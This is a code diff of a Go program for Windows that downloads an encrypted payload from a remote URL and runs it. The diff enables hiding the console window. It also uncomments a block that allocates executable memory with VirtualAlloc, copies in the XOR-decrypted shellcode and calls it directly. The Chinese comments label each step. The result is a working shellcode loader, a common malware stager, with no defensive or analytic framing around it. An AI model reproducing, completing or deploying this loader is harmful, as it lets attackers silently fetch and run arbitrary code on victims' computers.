@@ -15,7 +15,7 @@ var (
 )
 
 func main() {
-	//win.ShowWindow(win.GetConsoleWindow(), win.SW_HIDE)
+	win.ShowWindow(win.GetConsoleWindow(), win.SW_HIDE)
 
 	data := RemoteLoading(url)
 
@@ -32,23 +32,23 @@ func main() {
 	buf := XorDecrypt(decryptedBase64Data)
 	fmt.Println(buf)
 
-	/*
-		// 获取 kernel32.dll 中的 VirtualAlloc 函数
-		kernel32, _ := syscall.LoadDLL("kernel32.dll")
-		VirtualAlloc, _ := kernel32.FindProc("VirtualAlloc")
 
-		// 分配内存并写入 shellcode 内容
-		allocSize := uintptr(len(buf))
-		mem, _, _ := VirtualAlloc.Call(uintptr(0), allocSize, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
-		if mem == 0 {
-			panic("VirtualAlloc failed")
-		}
-		buffer := (*[0x1_000_000]byte)(unsafe.Pointer(mem))[:allocSize:allocSize]
-		copy(buffer, buf)
+    // 获取 kernel32.dll 中的 VirtualAlloc 函数
+    kernel32, _ := syscall.LoadDLL("kernel32.dll")
+    VirtualAlloc, _ := kernel32.FindProc("VirtualAlloc")
 
-		// 执行 shellcode
-		syscall.Syscall(mem, 0, 0, 0, 0)
-	*/
+    // 分配内存并写入 shellcode 内容
+    allocSize := uintptr(len(buf))
+    mem, _, _ := VirtualAlloc.Call(uintptr(0), allocSize, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
+    if mem == 0 {
+        panic("VirtualAlloc failed")
+    }
+    buffer := (*[0x1_000_000]byte)(unsafe.Pointer(mem))[:allocSize:allocSize]
+    copy(buffer, buf)
+
+    // 执行 shellcode
+    syscall.Syscall(mem, 0, 0, 0, 0)
+
 }
 
 func RemoteLoading(url string) string {
